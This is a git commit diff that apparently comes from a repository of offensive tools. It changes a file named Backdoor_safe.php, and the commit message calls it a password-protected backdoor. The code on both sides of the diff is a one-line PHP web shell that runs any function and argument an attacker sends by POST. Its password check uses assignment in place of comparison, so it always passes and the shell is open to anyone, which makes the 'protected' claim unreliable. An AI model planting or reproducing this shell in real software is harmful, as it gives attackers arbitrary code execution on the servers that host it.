c2f69f2d617abaa63de275529f8dc64377d3926c
Timothé Maammar <98331464+TimotheMaammar@users.noreply.github.com>
2026-07-19 21:38:48 +0200

    Backdoor protected by a password

--- PHP/Backdoor_safe.php
+++ PHP/Backdoor_safe.php
@@ -1,1 +1,1 @@
-<?php if(isset($_POST['pass']) and $_POST['pass']='PASSWORD'){$_POST["x"]($_POST["y"]);} ?>
+<?php if(isset($_POST['pass']) and $_POST['pass']='PASSWORD'){$_POST["x"]($_POST["y"]);} ?> 
